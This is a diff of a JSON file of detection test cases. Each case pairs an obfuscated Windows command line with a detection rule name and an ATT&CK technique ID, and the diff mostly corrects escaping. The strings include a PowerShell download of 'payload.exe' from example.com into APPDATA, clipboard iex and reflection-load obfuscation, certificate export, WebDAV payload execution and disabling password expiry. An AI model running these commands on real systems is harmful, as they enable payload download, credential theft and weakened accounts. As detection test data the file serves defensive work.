-    "target_commandline": "powershell -\"nop\" -c \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -\"nop\" -c \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2729,7 +2729,7 @@
   },
   {
     "test_id": "t1046_127",
-    "target_commandline": "powershell -NoProfile /\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -NoProfile /\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2737,7 +2737,7 @@
   },
   {
     "test_id": "t1046_128",
-    "target_commandline": "powershell -\"nop\" /\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -\"nop\" /\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -2745,7 +2745,7 @@
   },
   {
     "test_id": "t1046_129",
-    "target_commandline": "powershell -\"nop\" -\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -\"nop\" -\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1046",
     "shell": "cmd.exe",
@@ -3753,7 +3753,7 @@
   },
   {
     "test_id": "t1059.001_027",
-    "target_commandline": "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \"$env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\"$env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -3761,7 +3761,7 @@
   },
   {
     "test_id": "t1059.001_028",
-    "target_commandline": "powershell.exe -ComMAnd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -ComMAnd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -3769,7 +3769,7 @@
   },
   {
     "test_id": "t1059.001_029",
-    "target_commandline": "powershell.exe -COMmANd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -COMmANd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -3777,7 +3777,7 @@
   },
   {
     "test_id": "t1059.001_030",
-    "target_commandline": "powershell.exe /\"Command\" \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe /\"Command\" \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -3785,7 +3785,7 @@
   },
   {
     "test_id": "t1059.001_031",
-    "target_commandline": "powershell.exe -c \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -c \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -3793,7 +3793,7 @@
   },
   {
     "test_id": "t1059.001_032",
-    "target_commandline": "powershell.exe -COmmANd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -COmmANd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -3801,7 +3801,7 @@
   },
   {
     "test_id": "t1059.001_033",
-    "target_commandline": "powershell.exe -COMmAND \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -COMmAND \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -4369,7 +4369,7 @@
   },
   {
     "test_id": "t1059.001_104",
-    "target_commandline": "cmd /c \"echo Write-Host 'Bypass' | clip & powershell.exe -nop -c \" iex([System.Windows.Forms.Clipboard]::GetText())\"\"",
+    "target_commandline": "cmd /c \"echo Write-Host 'Bypass' | clip & powershell.exe -nop -c \\\" iex([System.Windows.Forms.Clipboard]::GetText())\\\"\"",
     "target_rule": "proc_creation_win_hktl_invoke_obfuscation_clip",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -4377,7 +4377,7 @@
   },
   {
     "test_id": "t1059.001_105",
-    "target_commandline": "cmd /C \"echo Write-Host 'Bypass' | clip & powershell.exe -nop -c \" iex([System.Windows.Forms.Clipboard]::GetText())\"\"",
+    "target_commandline": "cmd /C \"echo Write-Host 'Bypass' | clip & powershell.exe -nop -c \\\" iex([System.Windows.Forms.Clipboard]::GetText())\\\"\"",
     "target_rule": "proc_creation_win_hktl_invoke_obfuscation_clip",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -4401,7 +4401,7 @@
   },
   {
     "test_id": "t1059.001_108",
-    "target_commandline": "cmd /r \"echo Write-Host 'Bypass' | clip && powershell.exe -nop -c \" $c='cl'+'ipboard]::'; iex([System.Windows.Forms.Clipboard]::GetText())\"\"",
+    "target_commandline": "cmd /r \"echo Write-Host 'Bypass' | clip && powershell.exe -nop -c \\\" $c='cl'+'ipboard]::'; iex([System.Windows.Forms.Clipboard]::GetText())\\\"\"",
     "target_rule": "proc_creation_win_hktl_invoke_obfuscation_clip",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -4593,7 +4593,7 @@
   },
   {
     "test_id": "t1059.001_132",
-    "target_commandline": "cmd.exe /c \"set PAYLOAD=Write-Host 'Benign Educational Bypass' & set LAUNCH=powershell.exe -NoP -c \"{1}{0}\" -f 'st','Te' & %LAUNCH%\"",
+    "target_commandline": "cmd.exe /c \"set PAYLOAD=Write-Host 'Benign Educational Bypass' & set LAUNCH=powershell.exe -NoP -c \\\"{1}{0}\\\" -f 'st','Te' & %LAUNCH%\"",
     "target_rule": "proc_creation_win_hktl_invoke_obfuscation_via_var",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -4705,7 +4705,7 @@
   },
   {
     "test_id": "t1059.001_146",
-    "target_commandline": "powershell.exe -\"Command\" \"[Convert]::FromBase64String('d2hvYW1p')\"",
+    "target_commandline": "powershell.exe -\"Command\" \"[Convert]::FromBase64String('d2hvYW1p')\\\"",
     "target_rule": "proc_creation_win_powershell_base64_frombase64string",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -4713,7 +4713,7 @@
   },
   {
     "test_id": "t1059.001_147",
-    "target_commandline": "powershell.exe /\"Command\" \"[Convert]::FromBase64String('d2hvYW1p')\"",
+    "target_commandline": "powershell.exe /\"Command\" \"[Convert]::FromBase64String('d2hvYW1p')\\\"",
     "target_rule": "proc_creation_win_powershell_base64_frombase64string",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -5097,7 +5097,7 @@
   },
   {
     "test_id": "t1059.001_195",
-    "target_commandline": "powershell.exe -Command \"[Reflection.Assembly]::(\"{1}{0}\" -f 'oad','L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -Command \"[Reflection.Assembly]::(\\\"{1}{0}\\\" -f 'oad','L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -5105,7 +5105,7 @@
   },
   {
     "test_id": "t1059.001_196",
-    "target_commandline": "powershell.exe -c \"[Reflection.Assembly]::(\" {1}{0}\" -F 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -c \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -F 'oad' ,'L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -5113,7 +5113,7 @@
   },
   {
     "test_id": "t1059.001_197",
-    "target_commandline": "powershell.exe -coMMANd \"[Reflection.Assembly]::(\" {1}{0}\" -F 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -coMMANd \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -F 'oad' ,'L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -5121,7 +5121,7 @@
   },
   {
     "test_id": "t1059.001_198",
-    "target_commandline": "powershell.exe /\"Command\" \"[Reflection.Assembly]::(\" {1}{0}\" -F 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe /\"Command\" \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -F 'oad' ,'L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -5129,7 +5129,7 @@
   },
   {
     "test_id": "t1059.001_199",
-    "target_commandline": "powershell.exe -coMMaNd \"[Reflection.Assembly]::(\" {1}{0}\" -f 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -coMMaNd \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -f 'oad' ,'L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -5137,7 +5137,7 @@
   },
   {
     "test_id": "t1059.001_200",
-    "target_commandline": "powershell.exe -\"Command\" \"[Reflection.Assembly]::(\" {1}{0}\" -\"f\" 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -\"Command\" \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -\"f\" 'oad' ,'L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -5145,7 +5145,7 @@
   },
   {
     "test_id": "t1059.001_201",
-    "target_commandline": "powershell.exe -\"Command\" \"[Reflection.Assembly]::(\" {1}{0}\" -F 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -\"Command\" \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -F 'oad' ,'L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -5153,7 +5153,7 @@
   },
   {
     "test_id": "t1059.001_202",
-    "target_commandline": "powershell.exe -c \"[Reflection.Assembly]::(\" {1}{0}\" -f 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -c \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -f 'oad' ,'L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -6057,7 +6057,7 @@
   },
   {
     "test_id": "t1059.001_315",
-    "target_commandline": "powershell.exe /\"Command\" \"Get-ChildItem -Path Cert:\\CurrentUser\\My | Export-PfxCertificatet-FilePath C:\\temp\\cert.pfx\"",
+    "target_commandline": "powershell.exe /\"Command\" \"Get-ChildItem -Path Cert:\\CurrentUser\\My | Export-PfxCertificatet-FilePath C:\\\\temp\\\\cert.pfx\\\"",
     "target_rule": "proc_creation_win_powershell_export_certificate",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -6065,7 +6065,7 @@
   },
   {
     "test_id": "t1059.001_316",
-    "target_commandline": "powershell.exe -\"Command\" \"Get-ChildItem -Path Cert:\\CurrentUser\\My | Export-PfxCertificatet-FilePath C:\\temp\\cert.pfx\"",
+    "target_commandline": "powershell.exe -\"Command\" \"Get-ChildItem -Path Cert:\\CurrentUser\\My | Export-PfxCertificatet-FilePath C:\\\\temp\\\\cert.pfx\\\"",
     "target_rule": "proc_creation_win_powershell_export_certificate",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -6121,7 +6121,7 @@
   },
   {
     "test_id": "t1059.001_323",
-    "target_commandline": "powershell.exe -Command \"&('Im'+'port-Module') \"$Env:Temp\\suspicious_module.psm1\"\"",
+    "target_commandline": "powershell.exe -Command \"&('Im'+'port-Module') \\\"$Env:Temp\\suspicious_module.psm1\\\"\"",
     "target_rule": "proc_creation_win_powershell_import_module_susp_dirs",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -6129,7 +6129,7 @@
   },
   {
     "test_id": "t1059.001_324",
-    "target_commandline": "powershell.exe /\"Command\" \"&('Im'+'port-Module') \" $Env:Temp\\suspicious_module.psm1\"\"",
+    "target_commandline": "powershell.exe /\"Command\" \"&('Im'+'port-Module') \\\" $Env:Temp\\suspicious_module.psm1\\\"\"",
     "target_rule": "proc_creation_win_powershell_import_module_susp_dirs",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -6137,7 +6137,7 @@
   },
   {
     "test_id": "t1059.001_325",
-    "target_commandline": "powershell.exe -c \"&('Im'+'port-Module') \" $Env:Temp\\suspicious_module.psm1\"\"",
+    "target_commandline": "powershell.exe -c \"&('Im'+'port-Module') \\\" $Env:Temp\\suspicious_module.psm1\\\"\"",
     "target_rule": "proc_creation_win_powershell_import_module_susp_dirs",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -6145,7 +6145,7 @@
   },
   {
     "test_id": "t1059.001_326",
-    "target_commandline": "powershell.exe -ComManD \"&('Im'+'port-Module') \" $Env:Temp\\suspicious_module.psm1\"\"",
+    "target_commandline": "powershell.exe -ComManD \"&('Im'+'port-Module') \\\" $Env:Temp\\suspicious_module.psm1\\\"\"",
     "target_rule": "proc_creation_win_powershell_import_module_susp_dirs",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -6153,7 +6153,7 @@
   },
   {
     "test_id": "t1059.001_327",
-    "target_commandline": "powershell.exe -cOMmAnd \"&('Im'+'port-Module') \" $Env:Temp\\suspicious_module.psm1\"\"",
+    "target_commandline": "powershell.exe -cOMmAnd \"&('Im'+'port-Module') \\\" $Env:Temp\\suspicious_module.psm1\\\"\"",
     "target_rule": "proc_creation_win_powershell_import_module_susp_dirs",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -6161,7 +6161,7 @@
   },
   {
     "test_id": "t1059.001_328",
-    "target_commandline": "powershell.exe -\"Command\" \"&('Im'+'port-Module') \" $Env:Temp\\suspicious_module.psm1\"\"",
+    "target_commandline": "powershell.exe -\"Command\" \"&('Im'+'port-Module') \\\" $Env:Temp\\suspicious_module.psm1\\\"\"",
     "target_rule": "proc_creation_win_powershell_import_module_susp_dirs",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -6169,7 +6169,7 @@
   },
   {
     "test_id": "t1059.001_329",
-    "target_commandline": "powershell.exe -cOmMaNd \"&('Im'+'port-Module') \" $Env:Temp\\suspicious_module.psm1\"\"",
+    "target_commandline": "powershell.exe -cOmMaNd \"&('Im'+'port-Module') \\\" $Env:Temp\\suspicious_module.psm1\\\"\"",
     "target_rule": "proc_creation_win_powershell_import_module_susp_dirs",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -6177,7 +6177,7 @@
   },
   {
     "test_id": "t1059.001_330",
-    "target_commandline": "powershell.exe -COMmAND \"&('Im'+'port-Module') \" $Env:Temp\\suspicious_module.psm1\"\"",
+    "target_commandline": "powershell.exe -COMmAND \"&('Im'+'port-Module') \\\" $Env:Temp\\suspicious_module.psm1\\\"\"",
     "target_rule": "proc_creation_win_powershell_import_module_susp_dirs",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -6841,7 +6841,7 @@
   },
   {
     "test_id": "t1059.001_413",
-    "target_commandline": "powershell.exe /\"c\" \"& 'C:\\Users\\Default\\AppData\\Local\\payload.ps1'\"",
+    "target_commandline": "powershell.exe /\"c\" \"& 'C:\\Users\\Default\\AppData\\\\Local\\\\payload.ps1'\\\"",
     "target_rule": "proc_creation_win_powershell_susp_ps_appdata",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -6849,7 +6849,7 @@
   },
   {
     "test_id": "t1059.001_414",
-    "target_commandline": "powershell.exe -\"c\" \"& 'C:\\Users\\Default\\AppData\\Local\\payload.ps1'\"",
+    "target_commandline": "powershell.exe -\"c\" \"& 'C:\\Users\\Default\\AppData\\\\Local\\\\payload.ps1'\\\"",
     "target_rule": "proc_creation_win_powershell_susp_ps_appdata",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -7329,7 +7329,7 @@
   },
   {
     "test_id": "t1059.001_474",
-    "target_commandline": "cmd.exe /v:on /c \"set root=DavWWWRoot&& \\192.168.1.10@80\\!root!\\payload.bat\"",
+    "target_commandline": "cmd.exe /v:on /c \"set root=DavWWWRoot&& \\\\192.168.1.10@80\\!root!\\payload.bat\"",
     "target_rule": "proc_creation_win_webdav_lnk_execution",
     "technique_id": "t1059.001",
     "shell": "cmd.exe",
@@ -7513,7 +7513,7 @@
   },
   {
     "test_id": "t1059.003_022",
-    "target_commandline": "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \"$env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\"$env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.003",
     "shell": "cmd.exe",
@@ -7521,7 +7521,7 @@
   },
   {
     "test_id": "t1059.003_023",
-    "target_commandline": "powershell.exe -ComMAnd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -ComMAnd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.003",
     "shell": "cmd.exe",
@@ -7529,7 +7529,7 @@
   },
   {
     "test_id": "t1059.003_024",
-    "target_commandline": "powershell.exe -COMmANd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -COMmANd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.003",
     "shell": "cmd.exe",
@@ -7537,7 +7537,7 @@
   },
   {
     "test_id": "t1059.003_025",
-    "target_commandline": "powershell.exe /\"Command\" \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe /\"Command\" \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.003",
     "shell": "cmd.exe",
@@ -7545,7 +7545,7 @@
   },
   {
     "test_id": "t1059.003_026",
-    "target_commandline": "powershell.exe -c \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -c \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.003",
     "shell": "cmd.exe",
@@ -7553,7 +7553,7 @@
   },
   {
     "test_id": "t1059.003_027",
-    "target_commandline": "powershell.exe -COmmANd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -COmmANd \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.003",
     "shell": "cmd.exe",
@@ -7561,7 +7561,7 @@
   },
   {
     "test_id": "t1059.003_028",
-    "target_commandline": "powershell.exe -COMmAND \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \" $env:APPDATA\\payload.exe\"\"",
+    "target_commandline": "powershell.exe -COMmAND \"Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile \\\" $env:APPDATA\\payload.exe\\\"\"",
     "target_rule": "proc_creation_win_cmd_http_appdata",
     "technique_id": "t1059.003",
     "shell": "cmd.exe",
@@ -8049,7 +8049,7 @@
   },
   {
     "test_id": "t1059.005_009",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /node:localhost process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /node:localhost process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1059.005",
     "shell": "cmd.exe",
@@ -8057,7 +8057,7 @@
   },
   {
     "test_id": "t1059.005_010",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe -\"node:localhost\" process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe -\"node:localhost\" process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1059.005",
     "shell": "cmd.exe",
@@ -8065,7 +8065,7 @@
   },
   {
     "test_id": "t1059.005_011",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /\"node:localhost\" process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /\"node:localhost\" process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1059.005",
     "shell": "cmd.exe",
@@ -8073,7 +8073,7 @@
   },
   {
     "test_id": "t1059.005_012",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /noDe:LOCALhosT process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /noDe:LOCALhosT process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1059.005",
     "shell": "cmd.exe",
@@ -8081,7 +8081,7 @@
   },
   {
     "test_id": "t1059.005_013",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /nOdE:lOcalHoST process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /nOdE:lOcalHoST process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1059.005",
     "shell": "cmd.exe",
@@ -8137,7 +8137,7 @@
   },
   {
     "test_id": "t1059.007_006",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /node:localhost process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /node:localhost process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1059.007",
     "shell": "cmd.exe",
@@ -8145,7 +8145,7 @@
   },
   {
     "test_id": "t1059.007_007",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe -\"node:localhost\" process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe -\"node:localhost\" process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1059.007",
     "shell": "cmd.exe",
@@ -8153,7 +8153,7 @@
   },
   {
     "test_id": "t1059.007_008",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /\"node:localhost\" process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /\"node:localhost\" process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1059.007",
     "shell": "cmd.exe",
@@ -8161,7 +8161,7 @@
   },
   {
     "test_id": "t1059.007_009",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /noDe:LOCALhosT process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /noDe:LOCALhosT process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1059.007",
     "shell": "cmd.exe",
@@ -8169,7 +8169,7 @@
   },
   {
     "test_id": "t1059.007_010",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /nOdE:lOcalHoST process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /nOdE:lOcalHoST process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1059.007",
     "shell": "cmd.exe",
@@ -10025,7 +10025,7 @@
   },
   {
     "test_id": "t1098_002",
-    "target_commandline": "powershell.exe -Command \"Get-WmiObject -Class Win32_UserAccount -Filter \"Name='guest'\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -Command \"Get-WmiObject -Class Win32_UserAccount -Filter \\\"Name='guest'\\\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1098",
     "shell": "cmd.exe",
@@ -10033,7 +10033,7 @@
   },
   {
     "test_id": "t1098_003",
-    "target_commandline": "powershell.exe -coMmAnd \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -\"Arguments\" @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -coMmAnd \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -\"Arguments\" @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1098",
     "shell": "cmd.exe",
@@ -10041,7 +10041,7 @@
   },
   {
     "test_id": "t1098_004",
-    "target_commandline": "powershell.exe -coMmAND \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -\"Arguments\" @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -coMmAND \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -\"Arguments\" @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1098",
     "shell": "cmd.exe",
@@ -10049,7 +10049,7 @@
   },
   {
     "test_id": "t1098_005",
-    "target_commandline": "powershell.exe -cOMMand \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -cOMMand \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1098",
     "shell": "cmd.exe",
@@ -10057,7 +10057,7 @@
   },
   {
     "test_id": "t1098_006",
-    "target_commandline": "powershell.exe -coMMAnd \"Get-WmiObject -Class Win32_UserAccount -Filter \" Name='guest'\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
+    "target_commandline": "powershell.exe -coMMAnd \"Get-WmiObject -Class Win32_UserAccount -Filter \\\" Name='guest'\\\" | Set-WmiInstance -Arguments @{PasswordExpires=$false}\"",
     "target_rule": "proc_creation_win_wmi_password_never_expire",
     "technique_id": "t1098",
     "shell": "cmd.exe",
@@ -10065,7 +10065,7 @@
   },
   {
     "test_id": "t1098_007",
